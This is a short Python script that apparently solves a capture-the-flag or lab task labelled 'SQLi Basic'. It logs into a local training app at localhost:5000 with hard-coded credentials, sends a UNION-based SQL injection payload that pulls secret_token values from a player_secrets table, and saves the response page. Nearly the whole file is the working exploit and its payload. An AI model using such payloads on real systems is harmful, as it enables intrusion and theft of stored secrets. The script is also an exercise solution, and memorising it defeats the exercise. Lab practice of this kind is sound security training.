import requests
import re

BASE_URL = "http://localhost:5000"
LOGIN_URL = f"{BASE_URL}/login"
SQLI_URL = f"{BASE_URL}/sqli"

s = requests.Session()
s.post(LOGIN_URL, data={'roll_no': 'SEC23001', 'password': 'compass123'})

# Task 01: SQLi Basic
# The flag is in player_secrets table so we need to UNION SELECT IT

# Payload: ' AND 0 UNION SELECT secret_token, 'flag', 99999 FROM player_secrets --
payload = "' AND 0 UNION SELECT secret_token, 'flag', 99999 FROM player_secrets --"
r = s.get(SQLI_URL, params={'term': payload})

with open("task01_response.html", "w", encoding="utf-8") as f:
    f.write(r.text)

print("Response saved to task01_response.html")
